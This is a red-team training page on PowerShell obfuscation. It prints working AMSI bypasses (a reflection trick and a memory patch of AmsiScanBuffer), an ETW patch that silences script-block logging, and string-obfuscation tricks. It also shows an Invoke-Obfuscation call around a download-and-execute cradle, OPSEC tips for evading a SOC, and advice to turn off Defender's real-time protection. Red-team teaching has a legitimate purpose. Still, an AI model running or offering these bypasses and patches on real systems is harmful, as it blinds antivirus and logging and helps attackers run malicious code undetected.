---
layout: training-page
title: "PowerShell Obfuscation — Red Team Academy"
module: "Evasion"
tags:
  - powershell
  - obfuscation
  - amsi
  - bypass
  - defender
  - invoke-obfuscation
page_key: "evasion-powershell-obfuscation"
render_with_liquid: false
---

# PowerShell Obfuscation

PowerShell obfuscation defeats detection layers in three places: static signatures on disk, AMSI at script block compilation, and Event Tracing for Windows (ETW) at execution. Every layer needs a different mitigation — string obfuscation beats simple YARA rules but not AMSI, while patching AMSI itself neuters script-block logging but does nothing for process-creation telemetry.

This page consolidates technique references from the BC-SECURITY **Beginners-Guide-to-Obfuscation** workshop series (2021 / 2022) and the **Obfuscation-Reloaded-Techniques-for-Evading-Detection** DEFCON 33 workshop.

## Detection Surface

Before obfuscating, understand what you're evading:

| Layer | What it sees | What helps |
|-------|-------------|------------|
| Windows Defender static scan | File contents on disk, static signatures | String encoding, variable rename, tokenization |
| AMSI (`AmsiScanBuffer`) | Every buffer submitted during script-block compile | AST manipulation, AMSI patch, alternate hosting |
| Script-block logging (EID 4104) | The *compiled* script block (after de-obfuscation) | AMSI patch, runspace from C#, ETW patch |
| PowerShell module logging (EID 4103) | Cmdlet + parameter binding | Use .NET reflection instead of cmdlets |
| Sysmon EID 1 / 4688 | Process creation + command line | Remove `-EncodedCommand` / `IEX` signatures; no PowerShell.exe at all (PSHost-less) |
| ETW `Microsoft-Windows-PowerShell/Operational` | Runtime engine events | ETW patch |

## Layer 1 — Basic Obfuscation

These defeat static signatures but do nothing against AMSI. Still useful on older hosts and as the first step in a layered approach.

```
# String concatenation (breaks naive regex):
$cmd = 'I' + 'E' + 'X'
&$cmd $payload

# Base64 encode the whole script (note: EncodedCommand is itself signatured):
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$b64   = [Convert]::ToBase64String($bytes)
powershell.exe -NoProfile -EncodedCommand $b64

# ASCII/char array assembly:
$amsi = [char]65+[char]109+[char]115+[char]105   # "Amsi"

# Reverse strings:
$rev = -join ("nerlsiU".ToCharArray() | Sort-Object {Get-Random})    # poor man's scramble
# Better: compile-time constant reversal
$rev = -join ("isAmSIInitFailed".ToCharArray()[..-1])

# Variable name mangling:
${1} = 'whoami'; &${1}

# Backtick noise inside identifiers (PS parser ignores backticks in some positions):
I`E`X $payload

# Case-bit manipulation — PowerShell is case-insensitive:
iNvOkE-ExPrEsSiOn $payload

# Invoke-Obfuscation (Daniel Bohannon) — classic framework that automates all of the above:
Import-Module .\Invoke-Obfuscation.ps1
Invoke-Obfuscation -ScriptBlock {iex (New-Object Net.WebClient).DownloadString('http://...')} -Command 'TOKEN,ALL,1' -Quiet
Invoke-Obfuscation -ScriptBlock $sb -Command 'STRING,1,1,1' -Quiet
Invoke-Obfuscation -ScriptBlock $sb -Command 'COMPRESS,1' -Quiet
```

## Layer 2 — AMSI Bypass

AMSI (Antimalware Scan Interface) submits every buffer passed to `System.Management.Automation.dll` for scanning. Bypassing it is typically done by patching `amsi.dll!AmsiScanBuffer` in the current process to return `AMSI_RESULT_CLEAN`.

```
# Classic reflection-based patch (signatured — must be itself obfuscated):
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*siUtils"){$c=$b}}
$d=$c.GetFields('NonPublic,Static');foreach($e in $d){if($e.Name -like "*siInitFailed"){$f=$e}}
$f.SetValue($null,$true)

# Memory patch (overwrite first byte of AmsiScanBuffer with 0xC3 / RET 0):
$win32 = @"
using System; using System.Runtime.InteropServices;
public class Win32 {
  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
Add-Type $win32
$lib  = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($lib, "AmsiScanBuffer")
$p=0; [Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p) | Out-Null
[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$addr,6)

# Hardware-breakpoint AMSI bypass (Havoc Demon uses this technique for AMSI + ETW):
# Set an Int3 at AmsiScanBuffer entry via Dr0, catch in a VEH, set RAX=0 (E_INVALIDARG), skip.
# Advantages: no page write, no memory patch, survives memory integrity scans.
```

## Layer 3 — ETW Patch

After AMSI, Script Block logging (EID 4104) still captures the de-obfuscated script. Patch the ETW provider in-process to suppress it.

```
# Patch EtwEventWrite to return immediately (x64):
$etw  = [Win32]::GetProcAddress([Win32]::LoadLibrary('ntdll.dll'), 'EtwEventWrite')
$p=0; [Win32]::VirtualProtect($etw,[uint32]1,0x40,[ref]$p) | Out-Null
[Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3),0,$etw,1)

# .NET-side ETW patch (hits Microsoft-Windows-DotNETRuntime provider too):
$r = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$f = $r.GetField('etwProvider','NonPublic,Static')
$e = $f.GetValue($null)
$e.GetType().GetField('m_enabled','NonPublic,Instance').SetValue($e, 0)
```

## Layer 4 — Runspace / PSHost-less Execution

`powershell.exe` running on disk is a Sysmon EID 1 event. Skip it entirely by hosting the PowerShell runtime yourself.

```
# Run PowerShell from C# (System.Management.Automation.dll) — no powershell.exe child:
using (PowerShell ps = PowerShell.Create()) {
    ps.AddScript(File.ReadAllText("stage.ps1"));
    ps.Invoke();
}

# "PowerShell without PowerShell" / Unmanaged PowerShell (UnmanagedPowerShell, nps.exe,
# p0wnedshell, PowerPick) hosts the CLR from C/C++ and spins a runspace without the native
# executable ever starting. Combine with AMSI + ETW patches applied before the runspace
# initializes.
```

See also: `evasion/powershell-without-ps.md`, `amsi-bypass.md`.

## Obfuscation-Reloaded (DEFCON 33)

The BC-SECURITY "Obfuscation-Reloaded" workshop (DEFCON 33) expands the 2021/2022 material with:

- Modern AMSI evasion paths (hardware breakpoints, COM hijacking of AmsiEnable, low-level `Amsi*Session` tampering)
- Defender telemetry model updates — what changed in AMSI behavior after 2023 PowerShell 7.4 / Defender 1.399
- Living-off-scripting: abusing built-in `.ps1xml`, format files, and `about_*` help files
- Anti-analysis: timing checks, environmental guards (`$env:COMPUTERNAME` allowlists), and sandbox-evasion
- AST-walk and tokenizer-based obfuscation (go beyond regex replacement — modify the abstract syntax tree itself so decompilation produces meaningless code)

Repo layout (`BC-SECURITY/Obfuscation-Reloaded-Techniques-for-Evading-Detection`):

```
/slides      - the DEFCON 33 presentation PDF
/demos       - working obfuscation examples (intentionally flagged by Defender — extract to
               an excluded dir or with defender off before using)
/scripts     - helper PowerShell to apply obfuscation to a supplied payload
/labs        - walk-through exercises, each with a target detection + evasion path
```

> **Warning from the repo:** The demo binaries and scripts trigger Windows Defender on extract. BC-SECURITY explicitly recommends disabling real-time protection or placing the extracted files in a Defender-excluded directory before running.

## OPSEC

- **Do NOT use `Invoke-Obfuscation` output directly on engagements.** Every popular preset is signatured. Use it as a starting point, then mutate further.
- Obfuscating a stager and leaving the staged payload cleartext is worthless — AMSI still sees the decoded payload when it hits `Invoke-Expression`. Combine layers.
- Hardware-breakpoint AMSI bypasses are the current state of the art (as of 2025) against Windows 11 / Defender — simple patches are detected via memory integrity.
- Script Block logging still wins after successful AMSI bypass **if the log volume doesn't flood** your SOC and they actually look. Reduce surface area by running short, well-defined payloads, not entire PowerShell toolkits.

## Resources

- BC-SECURITY Beginners-Guide-to-Obfuscation — `github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation`
- BC-SECURITY Obfuscation-Reloaded — `github.com/BC-SECURITY/Obfuscation-Reloaded-Techniques-for-Evading-Detection`
- Invoke-Obfuscation — `github.com/danielbohannon/Invoke-Obfuscation`
- AMSI.fail — `amsi.fail`
- PSHost-less runners — `github.com/trustedsec/nps`, `github.com/G0ldenGunSec/PowerPick`
- See also: `evasion/amsi-bypass.md`, `evasion/powershell-without-ps.md`, `evasion/windows-defender.md`
